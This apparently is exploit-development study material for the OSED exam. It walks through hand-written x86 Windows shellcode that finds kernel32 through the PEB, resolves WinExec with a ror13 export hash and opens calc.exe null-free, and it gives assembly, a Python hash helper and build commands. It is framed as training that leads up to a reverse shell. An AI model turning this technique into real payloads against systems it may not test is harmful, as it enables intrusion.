# Hand-Rolled Shellcode — WinExec("calc.exe") from scratch

The canonical "I can write shellcode" exercise. Benign PoC (pops calc on your own lab box).
Once you can do this, a reverse shell is the same skill with more API calls. Pairs with
`03-shellcode/nasm-shellcode.md` and `reverse_shell.asm`.

Goal: resolve `WinExec` at runtime (no hardcoded addresses) and call
`WinExec("calc.exe", SW_SHOW)`.

---

## The two problems to solve
1. **Find kernel32.dll's base** — walk the PEB (no imports, position-independent).
2. **Find WinExec inside kernel32** — parse the export table, match by name (or hash).

Everything else is just pushing the right args and calling.

## Part 1 — PEB walk to kernel32 base (x86)
```nasm
BITS 32
start:
    xor  ecx, ecx                ; ecx = 0 (scratch, avoids null-byte literals)
    mov  eax, [fs:ecx+0x30]      ; EAX = PEB            (fs:[0x30])
    mov  eax, [eax+0x0C]         ; EAX = PEB->Ldr
    mov  eax, [eax+0x14]         ; EAX = Ldr->InMemoryOrderModuleList (1st entry: the EXE)
    mov  eax, [eax]              ; follow Flink -> 2nd entry (ntdll on most builds)
    mov  eax, [eax]              ; follow Flink -> 3rd entry (kernel32 on most builds)
    mov  ebx, [eax+0x10]         ; EBX = module base (DllBase) of that entry = kernel32
```
> The "1st=EXE, 2nd=ntdll, 3rd=kernel32" ordering holds on classic Windows loaders but is
> **not guaranteed** across all versions. The robust approach is to walk the list and check
> each module's export table for the function you need (or hash the module name). For a lab
> PoC the fixed walk is fine; know *why* the hashing version exists.

## Part 2 — parse kernel32's export table for WinExec
PE layout from the base in EBX:
```
base + 0x3C                 -> e_lfanew (offset to PE header)
PE   + 0x78                 -> RVA of IMAGE_EXPORT_DIRECTORY
export + 0x18               -> NumberOfNames
export + 0x20               -> RVA of AddressOfNames        (array of name RVAs)
export + 0x24               -> RVA of AddressOfNameOrdinals (array of ordinals)
export + 0x1C               -> RVA of AddressOfFunctions     (array of function RVAs)
```
Algorithm:
```
for i in 0..NumberOfNames-1:
    name = base + AddressOfNames[i]
    if strcmp(name, "WinExec") == 0:
        ordinal = AddressOfNameOrdinals[i]
        func    = base + AddressOfFunctions[ordinal]
        -> func is WinExec's address
```
In real shellcode you replace `strcmp("WinExec")` with a **ror-13 hash compare** so you
don't carry the plaintext string and you save bytes:
```
hash = 0
for each char c in name (including null):
    rotate hash right 13 bits
    add c to hash
compare hash to the precomputed hash of "WinExec"
```
The precomputed ror13 hash of `WinExec` is a constant you bake in (compute it once with a
small script; see below).

## Part 3 — call WinExec("calc.exe", 1)
WinExec is stdcall: `WinExec(LPCSTR lpCmdLine, UINT uCmdShow)`.
```nasm
    ; EAX = resolved WinExec address (from Part 2)
    xor  edx, edx
    push edx                     ; null terminator for the string
    push 0x6578652e              ; ".exe"  (little-endian: 2e 65 78 65)
    push 0x636c6163              ; "calc"  (little-endian: 63 61 6c 63)
    mov  ecx, esp                ; ECX -> "calc.exe\0"
    push 1                       ; uCmdShow = SW_SHOWNORMAL (1)
    push ecx                     ; lpCmdLine
    call eax                     ; WinExec("calc.exe", 1)
    ; optional clean exit:
    ; (resolve ExitProcess the same way, or let it fall through in a lab)
```
Note the string is pushed in reverse 4-byte chunks, null-terminated first. `"calc.exe"` is
8 bytes → two pushes + a null push. None of those dwords contain `\x00`, which is the point.

## Compute the ror13 hash constant (helper)
```python
def ror(v, n, bits=32): return ((v >> n) | (v << (bits-n))) & 0xFFFFFFFF
def ror13(name):
    h = 0
    for c in (name + "\x00"):
        h = ror(h, 13)
        h = (h + ord(c)) & 0xFFFFFFFF
    return h
print(hex(ror13("WinExec")))     # bake this constant into the hash-compare version
```
(Variants differ on whether the null byte is included and on the rotate amount — match your
loop to how you compute the constant. Verify by stepping in WinDbg.)

## Build, extract, verify
```bash
nasm -f bin calc.asm -o calc.bin
objdump -D -b binary -m i386 calc.bin           # eyeball the opcodes
python3 -c "print(''.join('\\\\x%02x'%b for b in open('calc.bin','rb').read()))"
# badchar check:
python3 - <<'PY'
sc=open('calc.bin','rb').read(); bad=b"\x00"
print("hits:", [(i,hex(c)) for i,c in enumerate(sc) if c in bad] or "clean")
PY
```
Test with the loader stub in `03-shellcode/build.md` (VirtualAlloc RWX → copy → call) under
WinDbg, and single-step the PEB walk the first time so you *see* EBX become kernel32's base.

## Why this matters for the exam
- OSED's "Creating Custom Shellcode" expects you to resolve APIs yourself.
- The PEB walk + export parse is the reusable core — swap `WinExec` for `LoadLibraryA` +
  `WSASocketA` + `connect` + `CreateProcessA` and you have the reverse shell
  (`reverse_shell.asm`).
- Doing it null-free teaches the register tricks you need everywhere else.

## Practice ladder
1. [ ] Fixed PEB walk → WinExec("calc") working under the loader.
2. [ ] Swap the name-compare for the ror13 hash version.
3. [ ] Make the whole thing 100% null-free; shrink it.
4. [ ] Add a clean `ExitProcess` (resolved the same way).
5. [ ] Graduate to the reverse shell in `reverse_shell.asm`.

> Lab/PoC use only — run shellcode exercises on systems you own or are authorized to test.
